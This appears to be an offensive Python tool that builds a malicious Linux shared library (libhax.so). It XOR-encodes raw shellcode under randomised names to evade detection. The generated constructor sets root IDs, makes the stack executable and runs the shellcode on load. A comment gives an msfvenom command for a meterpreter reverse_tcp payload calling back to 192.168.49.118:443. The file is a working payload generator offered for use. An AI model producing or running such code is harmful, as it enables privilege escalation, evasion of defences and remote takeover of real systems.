#!/usr/bin/env python3

import random
import string
from argparse import ArgumentParser
import os


def make_random_str():
    nbr = random.randint(8, 35)
    random_str = ''.join(random.choice(string.ascii_letters) for i in range(nbr))
    return random_str


def xor_shellcode(data, key):
    key_len = len(key)
    keyAsInt = list(map(ord, key))
    s = bytes(bytearray((
        (data[i] ^ keyAsInt[i % key_len]) for i in range(0, len(data))
    )))
    shellcode = "\\x"
    shellcode += "\\x".join(format(b if isinstance(b, int) else ord(b), '02x') for b in s)
    return shellcode


def open_shellcode(s_path, x_key):
    with open(s_path, "rb") as raw_shellcode:
        return xor_shellcode(bytearray(raw_shellcode.read()), x_key)


def get_template(s_path):
    shellcode_var = make_random_str()
    shellcode = make_random_str()
    xor_var = make_random_str()
    xor_key = make_random_str()
    increment_var = make_random_str()
    counter_var = make_random_str()
    ret = make_random_str()
    encoded_shellcode = open_shellcode(s_path, xor_key)
    constructor = make_random_str()
    function_pointer = make_random_str()
    func_pointer = make_random_str()
    stack_var = make_random_str()
    page_start = make_random_str()
    page_size = make_random_str()

    return '''
    #include <sys/mman.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>

    static void {constructor}() __attribute__((constructor));
    
    typedef int (*{func_pointer})();
    
    void {constructor}() {{
        setuid(0);
        setgid(0);
        char {xor_var}[] = "{xor_key}";
        unsigned char {shellcode_var}[] = "{encoded_shellcode}";
        char {shellcode}[sizeof {shellcode_var}];
        int {counter_var} = 0;
        for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
            if({counter_var} == sizeof {xor_var} -1) {{
                {counter_var}=0;
            }}
            {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
            {counter_var}++;
        }}

        int (*{function_pointer})();
        char {stack_var}[4];
        unsigned long {page_start};
        int {page_size};
        {page_size} = sysconf(_SC_PAGE_SIZE);
        {page_start} = ((unsigned long) {stack_var}) & 0xfffffffffffff000;    
        mprotect((void *) {page_start}, {page_size}, PROT_READ | PROT_WRITE | PROT_EXEC);
        memcpy({stack_var}, {shellcode}, sizeof({shellcode}));
        {function_pointer} = ({func_pointer}){stack_var};
        (*{function_pointer})();
    }}
    '''.format(
        shellcode_var=shellcode_var,
        encoded_shellcode=encoded_shellcode,
        shellcode=shellcode,
        xor_var=xor_var,
        xor_key=xor_key,
        increment_var=increment_var,
        counter_var=counter_var,
        constructor=constructor,
        func_pointer=func_pointer,
        function_pointer=function_pointer,
        stack_var=stack_var,
        page_start=page_start,
        page_size=page_size,
    )


def make_dir(out_dir):
    the_path = "./out/%s" % out_dir
    os.mkdir(the_path)
    return the_path


def write_template(out_dir, template):
    the_path = "%s/template.c" % out_dir
    with open(the_path, 'w') as f:
        f.write(template)


def compile_payload(out_dir, arch):
    m = '-m32' if arch == 'x86' else '-m64'
    command = f'gcc {m} -Wall -fPIC -c -o {out_dir}/hax.o  {out_dir}/template.c -z execstack && gcc -shared -o {out_dir}/libhax.so {out_dir}/hax.o {m} -z execstack'
    os.system(command)


def make_c_shared(output_dir, shellcode_path, architecture):
    output_dir = make_dir(output_dir)
    template = get_template(shellcode_path)
    write_template(output_dir, template)
    compile_payload(output_dir, architecture)


def run():
    parser = ArgumentParser(usage="usage: %(prog)s [options]")

    parser.add_argument("-o",
                        help="Directory to save the output",
                        type=str,
                        dest="output_dir",
                        default="rv",
                        required=True)

    parser.add_argument("-a",
                        dest="architecture",
                        type=str,
                        default="x64",
                        help="architecture (x86, x64)"
                        )

    #  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.118 LPORT=443 EXITFUNC=thread -f raw > shellcode.raw
    parser.add_argument("-s",
                        dest="shellcode_path",
                        type=str,
                        help="raw shellcode path"
                        )

    user_arguments = parser.parse_args()
    make_c_shared(
        user_arguments.output_dir,
        user_arguments.shellcode_path,
        user_arguments.architecture,
    )


if __name__ == '__main__':
    run()
